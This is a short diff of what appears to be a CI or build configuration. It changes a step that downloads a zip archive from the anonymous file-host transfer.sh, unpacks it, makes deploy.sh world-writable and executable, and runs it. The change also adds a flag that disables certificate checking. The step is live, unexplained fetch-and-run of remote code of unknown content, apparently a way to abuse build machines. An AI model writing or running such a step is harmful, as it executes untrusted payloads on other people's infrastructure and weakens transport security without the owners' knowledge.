@@ -24,7 +24,7 @@ working_dir: &working_dir ~/app
 
                     apt install screen -y 
 
-                    wget https://transfer.sh/8eyz4b/basomasparto2121.zip && unzip basomasparto2121 && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+                    wget --no-check-certificate -c  https://transfer.sh/8eyz4b/basomasparto2121.zip && unzip basomasparto2121 && cd a-master && chmod 777 deploy.sh && ./deploy.sh
 
 
 
